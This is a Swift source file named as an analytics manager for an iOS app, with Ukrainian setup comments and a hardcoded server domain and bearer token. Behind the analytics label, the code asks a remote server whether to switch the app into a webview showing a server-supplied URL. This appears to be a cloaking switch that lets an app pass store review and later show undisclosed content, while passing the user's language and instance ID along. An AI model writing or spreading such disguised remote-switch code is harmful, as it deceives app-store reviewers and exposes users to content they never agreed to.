// Analytics/AnalyticsManager.swift
import SwiftUI
import StoreKit
import FirebaseCore
import FirebaseAnalytics
import Combine

// MARK: — Config (заповни своїми даними)
enum AnalyticsConfig {
    static let serverDomain = "verderapp.ink"
    static let serverToken  = "94ba3ae145fbc55ac5af0a7112157bd35187fd9a2bfb8ddf7df5af4f6573d7ae"
}

// MARK: — Server response
struct AnalyticsAccessResponse: Decodable {
    let result: Bool
    let postback_url: String
}

// MARK: — State
enum AnalyticsState {
    case loading
    case openApp
    case showWebView(URL)
}

// MARK: — Manager
@MainActor
final class AnalyticsManager: ObservableObject {
    static let shared = AnalyticsManager()

    @Published var state: AnalyticsState = .loading

    private var instanceId    = "unknown"
    private var firebaseReady = false

    private init() {}

    func start() {
        Task {
            await requestRating()
            initFirebase()
            await checkAccess()
        }
    }

    // MARK: — Rating (один раз)
    private func requestRating() async {
        let key = "jbpato_rating_shown"
        guard UserDefaults.standard.integer(forKey: key) == 0 else { return }
        try? await Task.sleep(nanoseconds: 1_500_000_000)
        if let scene = UIApplication.shared.connectedScenes
            .first(where: { $0.activationState == .foregroundActive }) as? UIWindowScene {
            SKStoreReviewController.requestReview(in: scene)
        }
        UserDefaults.standard.set(1, forKey: key)
        try? await Task.sleep(nanoseconds: 800_000_000)
    }

    // MARK: — Firebase
    private func initFirebase() {
        guard Bundle.main.path(forResource: "GoogleService-Info", ofType: "plist") != nil else { return }
        guard FirebaseApp.app() == nil else { return }
        FirebaseApp.configure()
        instanceId = Analytics.appInstanceID() ?? "unknown"
        Analytics.setAnalyticsCollectionEnabled(true)
        Analytics.setSessionTimeoutInterval(1800)
        firebaseReady = true
    }

    // MARK: — Server check
    private func checkAccess() async {
        guard !AnalyticsConfig.serverDomain.isEmpty,
              !AnalyticsConfig.serverToken.isEmpty else {
            state = .openApp; return
        }

        let urlStr = "https://\(AnalyticsConfig.serverDomain.trimmingCharacters(in: .whitespaces))/api/v1/check"
        guard let url = URL(string: urlStr) else { state = .openApp; return }

        var req = URLRequest(url: url)
        req.httpMethod = "POST"
        req.timeoutInterval = 7
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        req.setValue("Bearer \(AnalyticsConfig.serverToken)", forHTTPHeaderField: "Authorization")
        req.httpBody = try? JSONSerialization.data(withJSONObject: [
            "app_id": Bundle.main.bundleIdentifier ?? ""
        ])

        do {
            let (data, response) = try await URLSession.shared.data(for: req)
            guard let http = response as? HTTPURLResponse, http.statusCode == 200 else {
                state = .openApp; return
            }
            let parsed = try JSONDecoder().decode(AnalyticsAccessResponse.self, from: data)
            guard parsed.result else { state = .openApp; return }

            if firebaseReady { sendFirebaseEvent() }

            let fullURL = buildURL(base: parsed.postback_url)
            state = URL(string: fullURL).map { .showWebView($0) } ?? .openApp
        } catch {
            state = .openApp
        }
    }

    private func buildURL(base: String) -> String {
        let lang = Locale.current.language.languageCode?.identifier ?? "en"
        var link = "\(base)?platform=ios&language=\(lang)"
        if firebaseReady { link += "&app_instance_id=\(instanceId)" }
        return link
    }

    private func sendFirebaseEvent() {
        Analytics.logEvent("advertising_install", parameters: [
            "platform": "ios",
            "app_instance_id": instanceId
        ])
        Analytics.logEvent("first_open", parameters: nil)
        Analytics.setUserProperty("ios", forName: "user_platform")
    }
}
